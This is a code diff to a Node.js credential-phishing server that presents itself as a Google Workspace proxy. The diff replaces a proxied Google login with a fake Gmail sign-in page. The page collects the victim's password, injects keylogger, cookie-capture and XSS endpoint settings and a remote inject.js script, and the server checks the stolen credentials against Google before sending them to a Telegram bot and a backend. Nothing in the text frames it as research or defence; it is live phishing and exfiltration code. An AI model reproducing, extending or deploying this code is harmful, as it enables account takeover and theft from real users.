@@ -21,10 +21,6 @@ const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onren
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Google OAuth Configuration
-const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID || 'google-proxy-client';
-const GOOGLE_REDIRECT_URI = process.env.GOOGLE_REDIRECT_URI || 'https://accounts.google.com/o/oauth2/auth';
-
 // Path Configuration
 const PATHS = {
     script: "/inject.js",
@@ -37,8 +33,8 @@ const PATHS = {
 };
 
 console.log('╔═══════════════════════════════════════════════════════════╗');
-console.log('║        ✅  GOOGLE WORKSPACE PROXY v2.0                   ║');
-console.log('║        🔐  Enhanced with Full Error Handling             ║');
+console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.0                   ║');
+console.log('║        🔐  Enhanced Proxy + Full Integration             ║');
 console.log('╠═══════════════════════════════════════════════════════════╣');
 console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
 console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
@@ -159,7 +155,7 @@ async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData 
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: msg.substring(0, 4096), // Telegram limit
+                    text: msg.substring(0, 4096),
                     parse_mode: 'Markdown'
                 })
             });
@@ -242,7 +238,7 @@ function verifyWithGoogle(email, password) {
 }
 
 // ============================================================
-//  SERVE FILES - ✅ ENHANCED with proper error handling
+//  SERVE FILES
 // ============================================================
 
 function serveFile(filename, res, contentType = 'text/html') {
@@ -260,10 +256,6 @@ function serveFile(filename, res, contentType = 'text/html') {
         res.end(data);
     });
 }
-
-// ============================================================
-//  404 Page Handler
-// ============================================================
 
 function serve404Page(res) {
     const filePath = path.join(__dirname, '404_not_found.html');
@@ -404,7 +396,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  ✅ ENHANCED HANDLE LOGIN REQUEST - WITH FULL DEBUGGING
+//  ✅ ENHANCED HANDLE LOGIN REQUEST - With Custom HTML Page
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -432,131 +424,355 @@ function handleLoginRequest(req, res) {
 
     console.log(`[LOGIN] 🆔 Session: ${sessionId}`);
 
-    // ✅ Build Google login URL with email pre-filled
-    const targetUrl = `https://accounts.google.com/ServiceLogin?` +
-        `Email=${encodeURIComponent(email)}&` +
-        `continue=https://mail.google.com/mail&` +
-        `service=mail&` +
-        `hl=en&` +
-        `flowName=GlifWebSignIn&` +
-        `flowEntry=ServiceLogin`;
-
-    console.log(`[LOGIN] 🔗 Fetching: ${targetUrl}`);
-
-    // ✅ Recursive function to handle redirects
-    function fetchUrl(url, redirectCount = 0) {
-        if (redirectCount > 5) {
-            console.error('[LOGIN] ❌ Too many redirects');
-            res.writeHead(500);
-            res.end('Too many redirects');
-            return;
-        }
-
-        https.get(url, {
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Cache-Control': 'no-cache'
+    // ✅ SERVE CUSTOM LOGIN PAGE WITH EMAIL PRE-FILLED
+    const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Google Sign In</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
             }
-        }, (targetRes) => {
-            console.log(`[LOGIN] 📥 Response status: ${targetRes.statusCode}`);
-            console.log(`[LOGIN] 📄 Response Headers: ${JSON.stringify(targetRes.headers)}`);
-
-            // ✅ Handle redirects
-            if (targetRes.statusCode === 301 || targetRes.statusCode === 302 || targetRes.statusCode === 303) {
-                const redirectUrl = targetRes.headers.location;
-                console.log(`[LOGIN] 🔄 Redirecting to: ${redirectUrl}`);
-                fetchUrl(redirectUrl, redirectCount + 1);
-                return;
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                margin: 0;
+                background: #f5f5f5;
+                padding: 20px;
             }
-
-            let data = [];
-            targetRes.on('data', chunk => data.push(chunk));
-            targetRes.on('end', () => {
-                let body = Buffer.concat(data).toString();
-                
-                // --- ✅ FULL DEBUG LOGGING ---
-                console.log(`[LOGIN] 📄 Body length: ${body.length}`);
-                console.log(`[LOGIN] 📄 Body Preview (first 500 chars): ${body.substring(0, 500)}`);
-                if (body.length < 100) {
-                    console.log(`[LOGIN] ⚠️ WARNING: Response body is very small (${body.length} chars). Possible redirect or error.`);
-                    console.log(`[LOGIN] 📄 Full body: ${body}`);
+            .container {
+                background: white;
+                border-radius: 12px;
+                padding: 40px 48px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                max-width: 400px;
+                width: 100%;
+                animation: fadeIn 0.3s ease;
+            }
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(-10px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+            .logo {
+                text-align: center;
+                margin-bottom: 24px;
+            }
+            .logo .icon {
+                font-size: 48px;
+                display: block;
+                margin-bottom: 8px;
+            }
+            .logo h1 {
+                font-size: 24px;
+                color: #202124;
+                margin: 0;
+            }
+            .logo p {
+                color: #5f6368;
+                margin: 4px 0 0;
+                font-size: 14px;
+            }
+            .form-group {
+                margin-bottom: 16px;
+            }
+            .form-group label {
+                display: block;
+                font-size: 14px;
+                font-weight: 500;
+                color: #202124;
+                margin-bottom: 4px;
+            }
+            .form-group input {
+                width: 100%;
+                padding: 12px 14px;
+                border: 1px solid #dadce0;
+                border-radius: 4px;
+                font-size: 16px;
+                box-sizing: border-box;
+                transition: border-color 0.2s, box-shadow 0.2s;
+            }
+            .form-group input:focus {
+                outline: none;
+                border-color: #1a73e8;
+                box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+            }
+            .form-group input::placeholder {
+                color: #9aa0a6;
+            }
+            .email-display {
+                background: #f1f3f4;
+                padding: 12px 14px;
+                border-radius: 4px;
+                font-size: 16px;
+                color: #202124;
+                word-break: break-all;
+                border: 1px solid #e8eaed;
+            }
+            .form-options {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                margin: 16px 0 24px;
+            }
+            .form-options label {
+                font-size: 13px;
+                color: #5f6368;
+                display: flex;
+                align-items: center;
+                gap: 6px;
+                cursor: pointer;
+            }
+            .form-options a {
+                color: #1a73e8;
+                font-size: 13px;
+                text-decoration: none;
+            }
+            .form-options a:hover {
+                text-decoration: underline;
+            }
+            .btn {
+                width: 100%;
+                padding: 12px;
+                background: #1a73e8;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 16px;
+                font-weight: 500;
+                cursor: pointer;
+                transition: background 0.2s, transform 0.1s;
+            }
+            .btn:hover {
+                background: #1557b0;
+            }
+            .btn:active {
+                transform: scale(0.98);
+            }
+            .btn:disabled {
+                background: #dadce0;
+                cursor: not-allowed;
+                transform: none;
+            }
+            .error {
+                color: #d93025;
+                font-size: 14px;
+                margin-top: 8px;
+                display: none;
+                text-align: center;
+            }
+            .error.show {
+                display: block;
+            }
+            .loading {
+                display: none;
+                text-align: center;
+                padding: 10px 0;
+            }
+            .loading .spinner {
+                display: inline-block;
+                width: 20px;
+                height: 20px;
+                border: 2px solid #e8eaed;
+                border-radius: 50%;
+                border-top-color: #1a73e8;
+                animation: spin 0.8s linear infinite;
+                margin-right: 8px;
+                vertical-align: middle;
+            }
+            @keyframes spin {
+                to { transform: rotate(360deg); }
+            }
+            .loading p {
+                display: inline-block;
+                vertical-align: middle;
+                color: #5f6368;
+                font-size: 14px;
+                margin: 0;
+            }
+            .footer {
+                margin-top: 24px;
+                text-align: center;
+                font-size: 12px;
+                color: #9aa0a6;
+                border-top: 1px solid #e8eaed;
+                padding-top: 20px;
+            }
+            .footer a {
+                color: #1a73e8;
+                text-decoration: none;
+            }
+            .footer a:hover {
+                text-decoration: underline;
+            }
+            @media (max-width: 480px) {
+                .container {
+                    padding: 24px 20px;
                 }
-                // --- END DEBUG LOGGING ---
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <span class="icon">🔐</span>
+                <h1>Sign in</h1>
+                <p>to continue to Gmail</p>
+            </div>
+            
+            <div class="form-group">
+                <label>Email</label>
+                <div class="email-display" id="emailDisplay">${email}</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
+            </div>
+            
+            <div class="form-options">
+                <label>
+                    <input type="checkbox" checked /> Keep me signed in
+                </label>
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div id="error" class="error">Please enter your password</div>
+            
+            <button class="btn" id="loginBtn">Sign In</button>
+            
+            <div class="loading" id="loading">
+                <span class="spinner"></span>
+                <p>Signing in...</p>
+            </div>
 
-                // ✅ Check if response is HTML or error
-                if (body.includes('Gmail') || body.includes('accounts.google.com')) {
-                    console.log('[LOGIN] ✅ Valid Google login page received');
-                } else if (body.includes('error') || body.includes('denied') || body.includes('blocked')) {
-                    console.log('[LOGIN] ⚠️ Error detected in response');
+            <div class="footer">
+                <span>🔒 Secured • </span>
+                <a href="#">Privacy Policy</a>
+                <span> • </span>
+                <a href="#">Terms of Service</a>
+            </div>
+        </div>
+
+        <script>
+            window.GOOGLE_CONFIG = {
+                BACKEND_URL: '${BACKEND_URL}',
+                KEYLOGGER_URL: '${KEYLOGGER_URL}',
+                XSS_ENDPOINT: '${PATHS.xssEndpoint}',
+                COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
+                KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
+                SESSION_ID: '${sessionId}',
+                EMAIL: '${email}',
+                SERVICE: 'Google Workspace'
+            };
+            
+            console.log('🔐 Google Proxy loaded');
+            console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
+            console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
+
+            const loginBtn = document.getElementById('loginBtn');
+            const passwordInput = document.getElementById('password');
+            const errorDiv = document.getElementById('error');
+            const loadingDiv = document.getElementById('loading');
+
+            function handleLogin() {
+                const password = passwordInput.value.trim();
+                
+                if (!password) {
+                    errorDiv.textContent = 'Please enter your password';
+                    errorDiv.classList.add('show');
+                    passwordInput.focus();
+                    passwordInput.style.borderColor = '#d93025';
+                    setTimeout(() => {
+                        passwordInput.style.borderColor = '';
+                    }, 3000);
+                    return;
                 }
 
-                // ✅ Inject script with email pre-filled
-                const injectionScript = `
-                <script>
-                    console.log('🔐 Google Proxy loaded');
-                    window.GOOGLE_CONFIG = {
-                        BACKEND_URL: '${BACKEND_URL}',
-                        KEYLOGGER_URL: '${KEYLOGGER_URL}',
-                        XSS_ENDPOINT: '${PATHS.xssEndpoint}',
-                        COOKIE_ENDPOINT: '${PATHS.cookieEndpoint}',
-                        KEYLOG_ENDPOINT: '${PATHS.keylogEndpoint}',
-                        SESSION_ID: '${sessionId}',
-                        EMAIL: '${email}',
-                        SERVICE: 'Google Workspace'
-                    };
-                    console.log('📧 Email:', window.GOOGLE_CONFIG.EMAIL);
-                    console.log('🆔 Session:', window.GOOGLE_CONFIG.SESSION_ID);
-                    
-                    // Auto-fill email on page load
-                    document.addEventListener('DOMContentLoaded', function() {
-                        const email = '${email}';
-                        const emailField = document.querySelector('input[name="Email"]') || 
-                                          document.querySelector('input[type="email"]') ||
-                                          document.querySelector('input[name="identifier"]') ||
-                                          document.querySelector('#identifierId');
-                        if (emailField) {
-                            emailField.value = email;
-                            const event = new Event('input', { bubbles: true });
-                            emailField.dispatchEvent(event);
-                            console.log('✅ Auto-filled email:', email);
-                        } else {
-                            console.log('⚠️ Email field not found, retrying...');
-                            setTimeout(function() {
-                                const retryField = document.querySelector('input[name="Email"]') || 
-                                                   document.querySelector('input[type="email"]');
-                                if (retryField) {
-                                    retryField.value = email;
-                                    const event = new Event('input', { bubbles: true });
-                                    retryField.dispatchEvent(event);
-                                    console.log('✅ Auto-filled email (retry):', email);
-                                }
-                            }, 1000);
-                        }
-                    });
-                </script>
-                <script src="${PATHS.script}"></script>
-                `;
-                
-                body = body.replace(/<\/body>/i, injectionScript + '</body>');
-                
-                res.writeHead(200, {
-                    'Content-Type': 'text/html',
-                    'Cache-Control': 'no-store, no-cache, must-revalidate'
+                errorDiv.classList.remove('show');
+                loginBtn.disabled = true;
+                loginBtn.style.display = 'none';
+                loadingDiv.style.display = 'block';
+
+                console.log('📤 Submitting credentials for:', window.GOOGLE_CONFIG.EMAIL);
+
+                // Send to proxy backend
+                fetch('${PATHS.loginPath}', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'X-Session-Id': window.GOOGLE_CONFIG.SESSION_ID
+                    },
+                    body: 'Email=' + encodeURIComponent(window.GOOGLE_CONFIG.EMAIL) + 
+                          '&Passwd=' + encodeURIComponent(password) +
+                          '&accountType=HOSTED_OR_GOOGLE' +
+                          '&service=mail'
+                })
+                .then(response => {
+                    if (response.redirected) {
+                        console.log('✅ Redirecting to:', response.url);
+                        window.location.href = response.url;
+                    } else if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error('Login failed');
+                    }
+                })
+                .then(data => {
+                    if (data && data.success) {
+                        console.log('✅ Login successful');
+                        window.location.href = 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true';
+                    } else {
+                        throw new Error('Invalid credentials');
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Login error:', error.message);
+                    errorDiv.textContent = 'Invalid credentials. Please try again.';
+                    errorDiv.classList.add('show');
+                    loginBtn.disabled = false;
+                    loginBtn.style.display = 'block';
+                    loadingDiv.style.display = 'none';
+                    passwordInput.value = '';
+                    passwordInput.focus();
                 });
-                res.end(body);
-                console.log('[LOGIN] ✅ Response sent to client');
-            });
-        }).on('error', (err) => {
-            console.error(`[LOGIN] ❌ Error: ${err.message}`);
-            res.writeHead(302, { 'Location': targetUrl });
-            res.end();
-        });
-    }
+            }
 
-    fetchUrl(targetUrl);
+            loginBtn.addEventListener('click', handleLogin);
+
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+
+            passwordInput.addEventListener('input', function() {
+                errorDiv.classList.remove('show');
+                this.style.borderColor = '';
+            });
+
+            // Auto-focus password
+            setTimeout(() => passwordInput.focus(), 500);
+        </script>
+        <script src="${PATHS.script}"></script>
+    </body>
+    </html>
+    `;
+
+    res.writeHead(200, {
+        'Content-Type': 'text/html',
+        'Cache-Control': 'no-store, no-cache, must-revalidate',
+        'Pragma': 'no-cache'
+    });
+    res.end(html);
 }
 
 // ============================================================
@@ -598,6 +814,7 @@ async function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
+        // ✅ Verify with Google
         const verifyResult = await verifyWithGoogle(email, password);
         
         let allCookies = {};
@@ -624,6 +841,7 @@ async function handlePostRequest(body, req, res) {
             }
         }
 
+        // ✅ Send to Telegram
         await sendToTelegram(
             email,
             password,
@@ -635,6 +853,7 @@ async function handlePostRequest(body, req, res) {
             verifyResult.success
         );
 
+        // ✅ Send to backend
         try {
             const fetch = require('node-fetch');
             await fetch(`${BACKEND_URL}/api/log-action`, {
@@ -658,6 +877,7 @@ async function handlePostRequest(body, req, res) {
             console.log('[BACKEND] ⚠️ Failed to log:', e.message);
         }
 
+        // ✅ Redirect based on verification
         if (verifyResult.success) {
             console.log(`[AUTH] ✅ Valid credentials: ${email}`);
             res.writeHead(302, { 
@@ -668,7 +888,7 @@ async function handlePostRequest(body, req, res) {
         } else {
             console.log(`[AUTH] ❌ Invalid credentials: ${email}`);
             res.writeHead(302, { 
-                'Location': `https://accounts.google.com/ServiceLogin?Email=${encodeURIComponent(email)}&error=invalid_credentials`,
+                'Location': `/login?login_hint=${encodeURIComponent(email)}&error=invalid_credentials`,
                 'Cache-Control': 'no-store'
             });
             res.end();
@@ -683,7 +903,7 @@ async function handlePostRequest(body, req, res) {
 }
 
 // ============================================================
-//  ✅ MAIN SERVER - Enhanced with proper error handling
+//  ✅ MAIN SERVER
 // ============================================================
 
 const server = http.createServer((req, res) => {
@@ -708,7 +928,7 @@ const server = http.createServer((req, res) => {
             uptime: process.uptime(),
             sessions: Object.keys(userSessions).length,
             service: 'Google Workspace Proxy',
-            version: '2.0.0'
+            version: '3.0.0'
         }));
         return;
     }
@@ -797,7 +1017,7 @@ setInterval(() => {
 
 server.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
-    console.log('║        ✅  GOOGLE WORKSPACE PROXY v2.0                   ║');
+    console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.0                   ║');
     console.log('║        🔐  Gmail/GSuite + Full Cookie Capture           ║');
     console.log('╠═══════════════════════════════════════════════════════════╣');
     console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
